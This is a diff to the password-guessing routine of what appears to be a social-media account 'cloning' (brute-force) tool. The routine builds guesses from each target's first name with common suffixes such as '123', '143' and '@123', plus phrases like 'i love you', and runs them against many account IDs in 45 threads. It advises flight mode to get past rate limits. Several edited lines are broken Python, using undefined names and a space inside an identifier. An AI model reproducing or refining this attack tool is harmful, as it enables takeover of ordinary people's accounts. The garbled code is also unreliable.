@@ -574,14 +574,13 @@ def passwrd():
     print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
     print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
     print('\033[0;97m===============================================')
-    with tred(max_workers=40) as pool:
+    with tred(max_workers=45) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
             frs = nmf.split(' ')[0]
             pwv = []
             if len(nmf)<6:
                 if len(frs)<3:
-                if len(las)<3:
                     pass
                 else:
                     pwv.append(frs+'1')
@@ -596,8 +595,8 @@ def passwrd():
                     pwv.append(frs+'143')
                     pwv.append(nmf)
                     pwv.append(nml)
-                    pwv.append(nmfrslas)
-                    pwv.append(nmfrs las)
+                    pwv.append(nmfrslast)
+                    pwv.append(nmfrs last)
                     pwv.append('57273200')
                     pwv.append('i love you')
                     pwv.append(frs+'@123')
@@ -617,7 +616,6 @@ def passwrd():
                     pwv.append(frs+'1111')
             else:
                 if len(frs)<3:
-                if len(las)<3:
                     pwv.append(nmf)
                 else:
                     pwv.append(frs+'1')
@@ -632,8 +630,8 @@ def passwrd():
                     pwv.append(frs+'143')
                     pwv.append(nmf)
                     pwv.append(nml)
-                    pwv.append(nmfrslas)
-                    pwv.append(nmfrs las)
+                    pwv.append(nmfrslast)
+                    pwv.append(nmfrs last)
                     pwv.append('57273200')
                     pwv.append('i love you')
                     pwv.append(frs+'@123')
